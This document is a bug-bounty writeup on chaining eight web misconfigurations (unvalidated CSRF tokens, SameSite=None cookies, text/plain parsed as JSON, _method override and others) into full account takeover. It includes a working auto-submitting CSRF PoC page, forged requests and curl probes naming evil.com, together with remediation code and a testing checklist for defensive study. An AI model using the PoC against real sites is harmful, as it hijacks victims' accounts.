# Chained Misconfigurations → Full Account Takeover (CSRF + CORS + SameSite Bypass)

> Eight individually low-severity misconfigurations chained into a one-click, zero-interaction full account takeover — despite CSRF tokens, `Secure`/`HttpOnly` cookies, strict CORS, and a WAF all being present.

**Full writeup:** [Medium — How I Chained Eight Misconfigurations to Bypass "Unbreakable" CSRF Tokens, SameSite Cookies, and CORS for Full Account Takeover](https://medium.com/@atifwrite/eight-doors-one-key-chaining-misconfigurations-into-full-account-takeover-d39b638ec00d)

---

## Table of Contents

- [TL;DR](#tldr)
- [Target Surface](#target-surface)
- [The Vulnerable Endpoint](#the-vulnerable-endpoint)
- [Misconfiguration 1 — CSRF Token Not Validated](#misconfiguration-1--csrf-token-not-validated)
- [Misconfiguration 2 — SameSite=None on Session Cookies](#misconfiguration-2--samesitenone-on-session-cookies)
- [Misconfiguration 3 — No Origin/Referer Validation](#misconfiguration-3--no-originreferer-validation)
- [The CORS Wall (and How Simple Requests Bypass It)](#the-cors-wall-and-how-simple-requests-bypass-it)
- [Misconfiguration 4 — text/plain Parsed as JSON](#misconfiguration-4--textplain-parsed-as-json)
- [Misconfiguration 5 — HTTP Method Override](#misconfiguration-5--http-method-override)
- [Misconfiguration 6 — No Step-Up Authentication](#misconfiguration-6--no-step-up-authentication)
- [Misconfiguration 7 — No Email Verification Loop](#misconfiguration-7--no-email-verification-loop)
- [Misconfiguration 8 — No Session Invalidation](#misconfiguration-8--no-session-invalidation)
- [Why the WAF Didn't Help](#why-the-waf-didnt-help)
- [The Chain, End to End](#the-chain-end-to-end)
- [Proof of Concept](#proof-of-concept)
- [The text/plain Form-Encoding Trick, Explained](#the-textplain-form-encoding-trick-explained)
- [Testing Methodology / Reusable Checklist](#testing-methodology--reusable-checklist)
- [Remediation](#remediation)
- [References](#references)
- [Disclosure](#disclosure)

---

## TL;DR

Every defense on this target looked correct in isolation. CSRF tokens were present on every request. Session cookies carried `Secure` and `HttpOnly`. CORS reflected only same-origin requests. A WAF sat in front of the whole stack. None of it mattered.

A legacy application endpoint let users change their account email with no re-authentication and no verification:

```
PUT /legacy/rest/v2/user
{"eMailAddress": "user@example.com", ...}
```

By chaining eight separate, individually low-severity misconfigurations, a single HTML file hosted on an attacker-controlled domain could change a victim's account email the instant they opened it — no click, no visible UI, no interaction beyond loading the page while authenticated. Since the password-reset flow trusts this field unconditionally, changing it is equivalent to taking over the account.

Removing **any single one** of the eight misconfigurations breaks the exploit. The severity lives entirely in the composition, not in any individual finding — which is also why this is worth documenting as one writeup instead of eight separate low-severity tickets.

## Target Surface

The application exposed two separate frontends against the same backend:

- A **modern Next.js BFF (Backend-for-Frontend)** — tightly configured: `SameSite=Lax` cookies, strict CORS, CSRF tokens validated on every mutating request.
- A **legacy AngularJS application** — still live for backward compatibility, proxied under `/legacy/`.

This pattern — a hardened new frontend sitting next to a half-retired legacy one — is extremely common in enterprise environments mid-migration. Security teams harden what they're actively building and deprioritize what's "being phased out." That legacy surface often shares the same backend, the same session cookies, and the same user data as the new app, meaning a vulnerability there carries exactly the same blast radius as one in the flagship product. **Legacy endpoints are a high-value hunting ground precisely because they get less review attention while retaining full privilege.**

## The Vulnerable Endpoint

```http
PUT /legacy/rest/v2/user HTTP/1.1
Host: target.example
Content-Type: application/json
X-CSRF-Token: <stok value>
Cookie: JSESSIONID=...; deh=...

{"eMailAddress":"user@example.com","firstName":"John","lastName":"Doe"}
```

This endpoint updates profile fields, including email. Critically:

- The email change is applied **instantly** — no confirmation link sent to the new address.
- **No notification** goes to the old address.
- **No password re-entry** or second factor is required.
- `eMailAddressVerified` silently flips to `False`, but that flag gates nothing downstream.
- The **password reset flow trusts this field** — whoever controls the email on the account controls password reset, and therefore the account.

Endpoints in this category — anything that changes recovery/contact email, adds an SSH key, adds an API token, or changes MFA settings — are "crown jewel" mutations and deserve disproportionate testing time relative to lower-impact functionality.

---

## Misconfiguration 1 — CSRF Token Not Validated

The frontend diligently sent `X-CSRF-Token` derived from a `stok` cookie — a classic double-submit cookie pattern, where a token is mirrored in both a cookie and a header/body field, and the server is supposed to confirm they match (since a cross-origin attacker can't read your cookies to forge a matching header).

**Test 1 — drop the header entirely:**

```http
PUT /legacy/rest/v2/user HTTP/1.1
Cookie: JSESSIONID=...; deh=...

{"eMailAddress":"no-csrf-token@test.com"}
```

Result: `200 OK`. Email changed.

**Test 2 — send a garbage value:**

```http
X-CSRF-Token: this-is-not-a-real-token
```

Result: `200 OK`. Email changed again.

### Why this happens in the wild

Double-submit CSRF protection is frequently implemented as a *client-side convention*, not a *server-side contract*. Someone builds the Angular interceptor that attaches the header on every `$http` call, ships it, and the team mentally checks the "CSRF protection" box — while nobody writes the backend filter that actually rejects requests missing or mismatching the token.

A very plausible root cause on Spring-based backends looks like this:

```java
@Configuration
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                // Added during the legacy app migration to "unblock"
                // it temporarily — and never scoped back down.
                .ignoringRequestMatchers("/legacy/**")
            );
        return http.build();
    }
}
```

A single `.ignoringRequestMatchers("/legacy/**")` disables CSRF enforcement for the entire legacy path prefix — including an endpoint that changes account recovery email.

**This is worth actively hunting for on any target.** When CSRF protection is inconsistent across an app's endpoints, the inconsistency is very often a URL-pattern exclusion rule sitting in a security config, added once as a temporary unblock during a migration and never revisited.

The fix is simple:

```java
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    // No exclusion for /legacy/** — every mutating route is covered.
);
```

### Testing tip

Never assume a CSRF token is validated just because it's present in requests. Always test:
1. Omit it entirely.
2. Send an empty string.
3. Send another valid user's token.
4. Send a stale/expired token.

Automated scanners frequently miss this because they see the token being sent and tag the endpoint "protected."

---

## Misconfiguration 2 — SameSite=None on Session Cookies

Even with CSRF validation broken, the attack still needs the browser to attach session cookies to a cross-origin request. Since 2020, Chrome and most major browsers default cookies to `SameSite=Lax`, which blocks cookies on cross-site requests that aren't top-level navigations with safe methods. That alone kills most classic CSRF.

But this app explicitly overrode the default:

```http
Set-Cookie: JSESSIONID=...; Path=/legacy; Secure; HttpOnly; SameSite=None
Set-Cookie: deh=...; Path=/legacy; HttpOnly; Secure; SameSite=None
```

`SameSite=None` tells the browser to send this cookie on **every** request, cross-origin or not, as long as it's HTTPS. Platforms set this deliberately when the app needs to function inside third-party iframes (embedded widgets, SSO flows, partner integrations), since `SameSite=Lax`/`Strict` cookies don't survive the iframe context.

A typical server-side snippet making that decision:

```java
Cookie session = new Cookie("JSESSIONID", sessionId);
session.setHttpOnly(true);
session.setSecure(true);
session.setPath("/legacy");
response.addHeader("Set-Cookie",
    String.format("%s=%s; Path=%s; HttpOnly; Secure; SameSite=None",
        session.getName(), session.getValue(), session.getPath()));
```

### Why this happens in the wild

`SameSite=None` is usually a legitimate, deliberate decision for one specific use case, but it gets applied **at the cookie level, not the endpoint level**. The browser has no concept of "send this cookie cross-origin only for the embed flow, but not for this other mutating endpoint." Once `SameSite=None` is set, every endpoint reachable with that cookie inherits the cross-origin exposure — including ones the team never intended to expose that way.

> **Caveat worth noting:** both cookies also carried `Path=/legacy`, a weak, incidental scoping control. It didn't matter here since the vulnerable endpoint lives under `/legacy` itself, but it's worth acknowledging rather than glossing over.

### Testing tip

Always check `Set-Cookie` headers across every subdomain and path prefix the app serves, not just the main login response. Teams often harden the primary domain's cookies while a legacy path, an embedded-widget subdomain, or an internal API carries looser settings on the same session identifier.

---

## Misconfiguration 3 — No Origin/Referer Validation

This is the one that, in hindsight, should have stopped everything else cold — and its absence deserves its own finding rather than a footnote.

Every forged request in this chain carried an `Origin` header pointing straight at the attacker's domain:

```
Origin: https://evil.com
Referer: https://evil.com/poc.html
```

The [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) recommends server-side Origin/Referer validation explicitly as a **defense-in-depth** layer — a check that exists precisely to catch the scenario where token-based CSRF protection fails or is missing on a given endpoint.

A minimal server-side filter would have caught this entire chain regardless of what happened with tokens, cookies, or content types:

```java
public class OriginCheckFilter extends OncePerRequestFilter {

    private static final Set<String> ALLOWED_ORIGINS = Set.of(
        "https://app.target.example",
        "https://target.example"
    );

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain)
            throws ServletException, IOException {

        if (isStateChanging(request.getMethod())) {
            String origin = request.getHeader("Origin");
            String referer = request.getHeader("Referer");

            boolean trusted =
                (origin != null && ALLOWED_ORIGINS.contains(origin)) ||
                (origin == null && referer != null &&
                    ALLOWED_ORIGINS.stream().anyMatch(referer::startsWith));

            if (!trusted) {
                response.sendError(HttpServletResponse.SC_FORBIDDEN, "Origin not allowed");
                return;
            }
        }
        chain.doFilter(request, response);
    }

    private boolean isStateChanging(String method) {
        return Set.of("POST", "PUT", "PATCH", "DELETE").contains(method);
    }
}
```

It's cheap to implement and doesn't depend on any cookie attribute or body-parsing behavior — making it resilient to the content-type and method-override tricks used later in this chain. The target server never looked at either header. Had it rejected requests whose `Origin` didn't match `target.example`, misconfigurations 1, 2, 4, and 5 would have been irrelevant.

### Testing tip

When you find a CSRF-able endpoint, always check whether `Origin`/`Referer` are present and whether server behavior changes when you alter or strip them:

```bash
curl -i -X PUT https://target.example/legacy/rest/v2/user \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -b "JSESSIONID=<session>; deh=<session>" \
  -d '{"eMailAddress":"origin-test@test.com"}'
```

If the response is identical regardless of what `Origin` says, you've confirmed a second, independent gap — not just a restatement of the token issue.

---

## The CORS Wall (and How Simple Requests Bypass It)

At this point: broken CSRF validation, cookies that travel cross-origin, no Origin check as a backstop. That should already be enough — except CORS is still technically in the way. Sending `Content-Type: application/json` cross-origin triggers a CORS preflight (`OPTIONS`), and the server only reflects `Access-Control-Allow-Origin` for same-origin requests. Preflight fails, browser never sends the real request.

This is the point where a lot of testers stop and move on. It's also where it pays to know the spec rather than the general shape of "CORS blocks cross-origin."

CORS preflighting is only triggered by **non-simple requests**. The [Fetch Standard](https://fetch.spec.whatwg.org/#cors-safelisted-request-header) defines a small set of **CORS-safelisted content types** that are exempt:

- `application/x-www-form-urlencoded`
- `multipart/form-data`
- `text/plain`

If an endpoint will process a body sent under one of these, the browser classifies it as a **simple request**: no preflight, sent directly, cookies and all.

> **The core distinction, worth internalizing:** CORS is a *response-confidentiality* control, not a *request-integrity* control. Plain `<form>` POSTs have always been able to hit any endpoint cross-origin; CORS just stops JavaScript from reading back what happened. If the endpoint mutates state as a side effect of being hit, and doesn't separately validate CSRF or Origin, CORS buys you nothing.

---

## Misconfiguration 4 — text/plain Parsed as JSON

```http
PUT /legacy/rest/v2/user HTTP/1.1
Content-Type: text/plain

{"eMailAddress":"textplain@test.com"}
```

Result: `200 OK`. Email changed.

The server didn't care that the declared content type was `text/plain` — it looked at the body, recognized JSON, and parsed it anyway. This is a well-known behavior in Java/Spring stacks using permissive `HttpMessageConverter` chains, and is often caused by a converter registered with too broad a media-type range:

```java
@Bean
public MappingJackson2HttpMessageConverter jacksonConverter() {
    MappingJackson2HttpMessageConverter converter =
        new MappingJackson2HttpMessageConverter();

    // Vulnerable: accepts text/plain as if it were JSON.
    converter.setSupportedMediaTypes(List.of(
        MediaType.APPLICATION_JSON,
        MediaType.TEXT_PLAIN
    ));
    return converter;
}
```

or a hand-rolled fallback parser sitting ahead of framework content negotiation:

```java
@PutMapping("/legacy/rest/v2/user")
public ResponseEntity<?> updateUser(@RequestBody String rawBody) {
    // Ignores the declared Content-Type entirely and just tries
    // to parse whatever arrived as JSON.
    UserUpdateRequest req = objectMapper.readValue(rawBody, UserUpdateRequest.class);
    userService.update(req);
    return ResponseEntity.ok(req);
}
```

### Why this happens in the wild

A developer wanted the API to be forgiving of clients that forget to set `Content-Type` correctly, and implemented "if it looks like JSON, parse it as JSON" instead of strictly enforcing the declared type. This leniency means `Content-Type` is now purely cosmetic from the browser's perspective — you can tell the browser "this is a CORS-safe simple request" while telling the server "but parse it as structured JSON anyway." The two parties disagree about what the request is, and that disagreement is exactly the gap CORS falls into.

The fix is to bind the endpoint to strict `consumes`:

```java
@PutMapping(value = "/legacy/rest/v2/user", consumes = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<?> updateUser(@RequestBody UserUpdateRequest req) {
    userService.update(req);
    return ResponseEntity.ok(req);
}
```

With `consumes` set strictly to `application/json`, a request sent as `text/plain` gets rejected with `415 Unsupported Media Type` before it ever reaches application logic.

### Testing tip

For every JSON-consuming endpoint, retest with `Content-Type: text/plain` and `multipart/form-data`:

```bash
curl -i -X PUT https://target.example/legacy/rest/v2/user \
  -H "Content-Type: text/plain" \
  -b "JSESSIONID=<session>; deh=<session>" \
  -d '{"eMailAddress":"textplain-test@test.com"}'
```

This is cheap, fast, and catches an entire class of CORS-preflight bypasses that automated scanners routinely miss because they only vary payloads, not `Content-Type`.

---

## Misconfiguration 5 — HTTP Method Override

HTML forms can only emit `GET` or `POST`. The endpoint is `PUT`. Even with everything else broken, a plain form submission sends `POST /legacy/rest/v2/user`, which either 404s, 405s, or hits an unrelated handler.

```http
POST /legacy/rest/v2/user?_method=PUT HTTP/1.1
Content-Type: text/plain

{"eMailAddress":"method-override@test.com"}
```

Result: `200 OK` — the server read `_method=PUT` and internally re-routed the `POST` as a `PUT`.

In Spring, this is typically enabled with a single filter bean:

```java
@Bean
public HiddenHttpMethodFilter hiddenHttpMethodFilter() {
    // Reads ?_method=PUT (or X-HTTP-Method-Override) and rewrites
    // the effective HTTP method before routing.
    return new HiddenHttpMethodFilter();
}
```

### Why this happens in the wild

Method override (`_method` query param, `X-HTTP-Method-Override` header) dates back to an era when not all HTTP clients, proxies, and browsers reliably supported `PUT`, `DELETE`, or `PATCH`. Rails (`_method`), Spring (`HiddenHttpMethodFilter`), and other frameworks ship it as an opt-in convenience — and it's frequently left enabled long after the compatibility reason for it has disappeared, because nobody thinks to revisit it. It's rarely flagged in review because it looks like harmless REST tooling, not an access control mechanism.

Functionally, it collapses the HTTP verb space: any endpoint behind any verb becomes reachable via a plain `POST` — exactly the one verb a raw HTML form can forge cross-origin.

> The server also accepted `X-HTTP-Method-Override` as a header, but headers (outside a small CORS-safelisted set) trigger preflight — so the query-string variant is the one that actually matters for exploitation here. Not every bypass vector is equally useful for CSRF; only the ones compatible with simple requests are.

### Testing tip

Always test whether `_method`, `X-HTTP-Method-Override`, or `X-Method-Override` are honored on REST APIs, especially those built on Rails, Spring, Laravel, or similar frameworks:

```bash
curl -i -X POST "https://target.example/legacy/rest/v2/user?_method=PUT" \
  -H "Content-Type: text/plain" \
  -b "JSESSIONID=<session>; deh=<session>" \
  -d '{"eMailAddress":"method-override-test@test.com"}'
```

If honored, your attack surface for CSRF expands from "GET/POST endpoints" to "every endpoint in the API."

---

## Misconfiguration 6 — No Step-Up Authentication

Per [NIST SP 800-63B §4.3](https://pages.nist.gov/800-63-3/sp800-63b.html) and [RFC 9470 (OAuth 2.0 Step-Up Authentication Challenge Protocol)](https://www.rfc-editor.org/rfc/rfc9470.html), security-critical operations — changing a recovery email, resetting MFA, adding a payment method — should require re-proof of presence: a fresh password, a TOTP code, a WebAuthn touch.

This endpoint required none of it. A live session cookie was sufficient to change the single most security-relevant field on the account. A reasonable version of what's missing:

```java
@PutMapping(value = "/legacy/rest/v2/user", consumes = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<?> updateUser(@RequestBody UserUpdateRequest req,
                                     @RequestHeader("X-Reauth-Token") String reauthToken,
                                     HttpSession session) {

    if (req.getEMailAddress() != null) {
        // Changing the recovery email is sensitive: require a fresh
        // re-authentication token, issued within the last few minutes —
        // not just a valid long-lived session cookie.
        if (!reauthService.isRecentlyVerified(session, reauthToken)) {
            return ResponseEntity.status(401).body("Re-authentication required");
        }
    }
    userService.update(req);
    return ResponseEntity.ok(req);
}
```

Step-up auth is the control that should have independently stopped this entire chain even if CSRF, Origin validation, CORS, and content-type handling were all airtight. It specifically exists to limit blast radius when something upstream fails — and here, nothing upstream was checking it was needed.

---

## Misconfiguration 7 — No Email Verification Loop

The new email takes effect immediately. `eMailAddressVerified` flips to `False`, but that flag is cosmetic if nothing reads it. The password reset flow sent its link to whatever address currently sat in that field, verified or not. No confirmation email went to the old address either — the control that would have given the real user a chance to notice and react.

The [OWASP Account Takeover Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Account_Takeover_Prevention_Cheat_Sheet.html) is explicit about this pattern. A safer flow:

```java
public void requestEmailChange(User user, String newEmail) {
    String token = tokenService.generate();
    pendingEmailChanges.save(user.getId(), newEmail, token, Instant.now().plus(Duration.ofHours(1)));

    // Nothing takes effect yet. The new address must confirm first,
    // and the old address is told regardless, so the real owner has
    // a chance to react if this wasn't them.
    mailer.send(newEmail, "Confirm your new email", confirmLink(token));
    mailer.send(user.getCurrentEmail(), "Your email change was requested",
        "If this wasn't you, secure your account now.");
}

public void confirmEmailChange(String token) {
    PendingChange change = pendingEmailChanges.consume(token)
        .orElseThrow(() -> new InvalidTokenException());
    userService.setEmail(change.getUserId(), change.getNewEmail());
}
```

Email changes should require the new address to confirm via a link before it becomes authoritative, and notify the old address regardless — specifically to catch this kind of attack in progress.

---

## Misconfiguration 8 — No Session Invalidation

After the email changed, the victim's existing session stayed fully alive. Nothing forced re-authentication, and no other active sessions were invalidated.

This matters more than it looks like at first glance, because of what it means for attacker timing. Without session invalidation, the attacker doesn't need to race the victim or act within some narrow window — they can let the victim keep using the app completely undisturbed, with no visible sign anything happened, while separately triggering a password reset to the now-hijacked address at their own leisure.

A minimal mitigation:

```java
public void onEmailChanged(Long userId) {
    userService.markEmailChanged(userId);
    // Force everyone except the request that just made this
    // change to re-authenticate.
    sessionRegistry.invalidateAllExcept(userId, currentSessionId());
    mailer.send(user.getPreviousEmail(), "Your account email just changed");
}
```

Forcing re-authentication (or at minimum invalidating other active sessions) whenever a recovery-critical field changes is a standard control, touched on in NIST 800-63B's guidance on session management following credential/authenticator changes. Its absence here turns a narrow exploitation window into an indefinite one.

---

## Why the WAF Didn't Help

Worth circling back to the WAF mentioned at the top, because its silence is a useful lesson on its own.

WAFs work primarily by pattern-matching request content against signatures for known attack classes — SQL injection syntax, XSS payloads, path traversal sequences, known exploit strings for CVEs. What they're generally **not** built to reason about is business logic: whether *this* request, from *this* origin, to *this* endpoint, with a session cookie belonging to *this* user, represents a legitimate action.

The final exploit request is, from a pure pattern-matching standpoint, almost perfectly unremarkable:

```http
POST /legacy/rest/v2/user?_method=PUT HTTP/1.1
Content-Type: text/plain
Cookie: JSESSIONID=<valid session>; deh=<valid session>

{"eMailAddress":"attacker@evil.com","x":"="}
```

No SQL syntax, no script tags, no traversal sequences, no known malicious signature anywhere in it. The body is syntactically valid, boring JSON. The session cookie is completely legitimate — it's the victim's own. The only thing wrong with the request is **context**: it originated from `evil.com`, and no control downstream of the WAF ever checked that context.

**WAFs are not a substitute for CSRF protection, Origin validation, or authorization logic.** They catch malicious payloads; they don't catch malicious contexts — and CSRF is fundamentally a context problem, not a payload problem.

---

## The Chain, End to End

| # | Misconfiguration | What it defeats |
|---|---|---|
| 1 | CSRF token sent, not validated server-side | Primary CSRF defense |
| 2 | `SameSite=None` on session cookies | Browser's built-in CSRF mitigation |
| 3 | No Origin/Referer validation | Defense-in-depth CSRF backstop |
| 4 | `text/plain` parsed as JSON | CORS preflight requirement |
| 5 | `_method=PUT` override | HTML form's GET/POST-only limitation |
| 6 | No step-up authentication | Defense-in-depth for sensitive actions |
| 7 | No email verification / no old-email notification | Blast-radius containment |
| 8 | No session invalidation after sensitive change | Attacker's exploitation time window |

Break any single link and the exploit either stops working or shrinks dramatically in impact. No individual finding here would score above "Medium" on its own in most bug bounty triage — the severity lives entirely in the composition.

---

## Proof of Concept

> **For authorized security testing only.** Replace `TARGET_HOST` and `ATTACKER_EMAIL` before use. Do not use against systems you do not have explicit permission to test.

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
  <h1>Please wait...</h1>
  <form id="csrf"
    action="https://TARGET_HOST/legacy/rest/v2/user?_method=PUT"
    method="POST"
    enctype="text/plain">
    <input type="hidden"
      name='{"eMailAddress":"ATTACKER_EMAIL@example.com","x":"'
      value='"}'>
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

A victim simply opening this page (hosted anywhere, e.g. `evil.com`) while authenticated to the target triggers an automatic, invisible form submission that changes their account email — no click, no confirmation, no visible UI.

### What the server actually receives

```http
POST /legacy/rest/v2/user?_method=PUT HTTP/1.1
Host: target.example
Content-Type: text/plain
Origin: https://evil.com
Referer: https://evil.com/poc.html
Cookie: JSESSIONID=<victim-session>; deh=<victim-session>

{"eMailAddress":"attacker@evil.com","x":"="}
```

```json
{
  "eMailAddress": "attacker@evil.com",
  "eMailAddressVerified": "False"
}
```

Note `Origin: https://evil.com` right there in the request, completely unvalidated (misconfiguration 3). CORS governs whether JavaScript on `evil.com` is allowed to **read** the response — it says nothing about whether the browser is allowed to **send** the request. Simple requests are sent unconditionally; `Access-Control-Allow-Origin` only determines whether the attacker's script can see what came back. Since this attack doesn't need to read the response — it's a pure state-changing side effect — CORS was never in a position to stop it, no matter how strictly it was configured.

---

## The text/plain Form-Encoding Trick, Explained

When a browser serializes a `<form enctype="text/plain">`, it doesn't JSON-encode anything — it just writes `name=value` pairs, one per line, literally. Normally that produces garbage from a JSON parser's perspective. But choosing the field `name` and `value` carefully makes the browser's plain `name=value` concatenation land exactly on valid JSON syntax:

```
name:  {"eMailAddress":"attacker@evil.com","x":"
value: "}
```

You can verify this encoding behavior yourself in a browser console, without touching any target:

```javascript
const form = document.createElement('form');
form.enctype = 'text/plain';

const input = document.createElement('input');
input.name = '{"eMailAddress":"attacker@evil.com","x":"';
input.value = '"}';
form.appendChild(input);

// This mirrors what the browser sends as the body:
console.log(`${input.name}=${input.value}`);
// {"eMailAddress":"attacker@evil.com","x":"="}
```

Concatenated by the browser as `name=value`:

```json
{"eMailAddress":"attacker@evil.com","x":"="}
```

The `=` character the browser inserts between name and value doesn't break anything — it lands inside the string value of the `"x"` property, which the server-side JSON parser treats as an arbitrary ignored field. The attacker-controlled `eMailAddress` value sits cleanly inside its own properly-quoted string, untouched by the encoding mechanics.

This technique only works because of **Misconfiguration 4**. If the server actually enforced `Content-Type: application/json`, this entire construction would be rejected outright regardless of how clever the encoding is.

---

## Testing Methodology / Reusable Checklist

A condensed checklist for retesting this pattern on other targets:

- [ ] Strip the CSRF token header entirely — does the request still succeed?
- [ ] Send a garbage/mismatched CSRF token — does it still succeed?
- [ ] Check `Set-Cookie` headers across **every** subdomain/path prefix, not just the main app — look for `SameSite=None` on session cookies.
- [ ] Send the request with `Origin: https://evil.com` — does server behavior change?
- [ ] Retest JSON endpoints with `Content-Type: text/plain` and `multipart/form-data` — does the body still parse?
- [ ] Test `?_method=PUT`, `?_method=DELETE`, `X-HTTP-Method-Override`, `X-Method-Override` on REST endpoints restricted to non-forgeable verbs.
- [ ] For any endpoint touching recovery email/phone/MFA/API keys: is re-authentication (password/TOTP/WebAuthn) required?
- [ ] After a sensitive field change: is a verification step required before it takes effect? Is the old value's owner notified?
- [ ] After a sensitive field change: are other active sessions invalidated, or does the attacker get an indefinite window?
- [ ] Don't triage any of the above in isolation — ask "what stops this end-to-end," not "does this one control stop it."

---

## Remediation

- **Validate CSRF tokens server-side** on every mutating endpoint, including legacy/deprecated routes. Don't assume token generation implies token validation.
- **Scope `SameSite=None` cookies as narrowly as possible.** If needed for iframe embedding, consider splitting session concerns: a narrowly-scoped embed token versus the primary session cookie, so the high-privilege cookie doesn't inherit exposure it doesn't need.
- **Add server-side Origin/Referer allowlisting** as defense-in-depth on all state-changing endpoints, independent of token validation.
- **Enforce declared `Content-Type` strictly.** Reject bodies that don't match the declared type instead of auto-detecting and parsing anyway (`consumes = "application/json"`, reject with `415` otherwise).
- **Disable or tightly restrict HTTP method override** in production, or require it to come with the same CSRF/auth checks as the real verb would.
- **Require step-up authentication** (password re-entry, TOTP, WebAuthn) before any change to recovery email, phone, MFA settings, or credentials.
- **Gate email changes behind a verification loop**: new address must confirm via link before becoming authoritative; old address always receives a "your email was changed" notice regardless.
- **Invalidate other active sessions** (or force re-authentication) whenever a recovery-critical field changes, to cap the attacker's exploitation window.

---

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Account Takeover Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Account_Takeover_Prevention_Cheat_Sheet.html)
- [Fetch Standard — CORS-safelisted request headers](https://fetch.spec.whatwg.org/#cors-safelisted-request-header)
- [NIST SP 800-63B §4.3](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [RFC 9470 — OAuth 2.0 Step-Up Authentication Challenge Protocol](https://www.rfc-editor.org/rfc/rfc9470.html)
- [RFC 8259 — The JavaScript Object Notation (JSON) Data Interchange Format](https://www.rfc-editor.org/rfc/rfc8259)

---

## Disclosure

Found and reported via a private bug bounty program. Target name, domain, and identifying details have been redacted/genericized throughout this writeup and PoC in line with program disclosure policy. The PoC above uses placeholder values (`TARGET_HOST`, `ATTACKER_EMAIL`) and must not be pointed at any system without explicit authorization.

## License

Provided for educational and authorized security-testing purposes only. MIT License — see repository for full license text.
